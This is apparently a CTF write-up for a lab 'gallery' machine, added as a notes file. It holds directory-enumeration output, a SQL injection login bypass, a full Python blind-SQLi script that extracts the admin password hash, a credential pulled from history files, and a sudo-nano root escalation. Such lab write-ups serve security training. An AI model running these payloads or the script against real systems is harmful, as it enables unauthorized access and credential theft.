@@ -1,0 +1,186 @@
+
+IP - 10.10.42.167
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+gobuster dir --url http://10.10.42.167/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,ssh,js,css -t 40
+
+http://10.10.42.167/gallery/
+
+
+
+┌──(root㉿kali)-[~]
+└─# gobuster dir --url http://10.10.42.167/gallery/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,ssh,js,css -t 40
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.42.167/gallery/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              ssh,js,css,php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2022/12/26 04:23:48 Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/.hta.txt             (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.hta.ssh             (Status: 403) [Size: 277]
+/.hta.js              (Status: 403) [Size: 277]
+/.hta.css             (Status: 403) [Size: 277]
+/.hta.html            (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.css        (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.ssh        (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess.js         (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.ssh        (Status: 403) [Size: 277]
+/.htpasswd.js         (Status: 403) [Size: 277]
+/.htpasswd.css        (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/404.html             (Status: 200) [Size: 198]
+/albums               (Status: 301) [Size: 321] [--> http://10.10.42.167/gallery/albums/]
+/archives             (Status: 301) [Size: 323] [--> http://10.10.42.167/gallery/archives/]
+/assets               (Status: 301) [Size: 321] [--> http://10.10.42.167/gallery/assets/]
+/build                (Status: 301) [Size: 320] [--> http://10.10.42.167/gallery/build/]
+/classes              (Status: 301) [Size: 322] [--> http://10.10.42.167/gallery/classes/]
+/config.php           (Status: 200) [Size: 0]
+/create_account.php   (Status: 200) [Size: 8]
+/database             (Status: 301) [Size: 323] [--> http://10.10.42.167/gallery/database/]
+/dist                 (Status: 301) [Size: 319] [--> http://10.10.42.167/gallery/dist/]
+/home.php             (Status: 500) [Size: 0]
+/inc                  (Status: 301) [Size: 318] [--> http://10.10.42.167/gallery/inc/]
+/index.php            (Status: 200) [Size: 16897]
+/index.php            (Status: 200) [Size: 16897]
+/login.php            (Status: 200) [Size: 8021]
+/plugins              (Status: 301) [Size: 322] [--> http://10.10.42.167/gallery/plugins/]
+/report               (Status: 301) [Size: 321] [--> http://10.10.42.167/gallery/report/]
+/uploads              (Status: 301) [Size: 322] [--> http://10.10.42.167/gallery/uploads/]
+/user                 (Status: 301) [Size: 319] [--> http://10.10.42.167/gallery/user/]
+Progress: 32298 / 32305 (99.98%)===============================================================
+2022/12/26 04:26:53 Finished
+===============================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Login page can bypass with SQLi 
+
+admin' or 1=1 -- -
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+target is vulnerable to sqli so I use this script for admin password hash sqli.py 
+
+┌──(root㉿kali)-[~/Desktop/THM_CTF/gallery]
+└─# python sqli.py http://10.10.80.90/gallery/
+[+] Authenticated cookie: PHPSESSID=uth9n09l2amaj9v16i2cphb0nm; path=/
+[+] Leaking username
+[+] username leaked: admin
+
+[+] Brute force MD5 password hash using blind SQL Injection
+[+] Hash Leaked: a228b12a08b6527e7978cbe5d914531c
+
+scripts:
+
+#!/usr/bin/env python3
+
+import requests
+import re
+import string
+import sys
+
+hex_string = string.ascii_letters + string.digits
+
+if len(sys.argv) != 2:
+    print("[~] Usage python3 exploit.py <URL>")
+    sys.exit(1)
+
+url = sys.argv[1]
+
+def leak_username():
+    global url
+    data = {
+            "username" : "' or '1'='1'-- -",
+            "password" : "musyoka"
+            }
+    output = requests.post(f"{url}/classes/Login.php?f=login", data = data)
+    cookie = output.headers
+    cookie = cookie["Set-Cookie"]
+    auth_cookie = cookie.split(";")[0]
+    print(f"[+] Authenticated cookie: {cookie}")
+    print("[+] Leaking username")
+    username = requests.get(f"{url}/?page=user", headers = {"Cookie" : auth_cookie})
+    user = re.search('username" id="username" class="form-control" value="(.*?)"', username.text, re.DOTALL).group(1)
+    print(f"[+] username leaked: {user}\n")
+    print("[+] Brute force MD5 password hash using blind SQL Injection")
+    return user
+
+def leak_password():
+    global hex_string, url
+    username = leak_username()
+    admin_hash = ""
+    while len(admin_hash) != 32:
+        for letter in hex_string:
+            write = admin_hash + letter
+            sys.stdout.write(f"\r[+] Hash Leaked: {write}")
+            payload = f"{username}' and binary password  like '{write}%'-- -"
+            data = {
+                    "username" : payload,
+                    "password" : "musyoka"
+                    }
+            output = requests.post(f"{url}/classes/Login.php?f=login", data = data)
+            if "success" in output.text:
+                admin_hash += letter
+                break
+if __name__ ==  ("__main__"):
+    leak_password()
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+╔══════════╣ Searching passwords in history files
+      @stats   = stats                                                                                                                                                                      
+      @items   = { _seq_: 1  }
+      @threads = { _seq_: "A" }
+sudo -lb3stpassw0rdbr0xx
+sudo -l
+
+
+username - mike
+password - b3stpassw0rdbr0xx
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+priv escalation with
+
+sudo -l
+
+sudo /bin/bash /opt/rootkit.sh
+
+https://gtfobins.github.io/gtfobins/nano/#sudo
+
+type read
+
+ctrl + r, ctrl + x
+
+reset; sh 1>&0 2>&0
+
+whoami
+
+
+
+
+
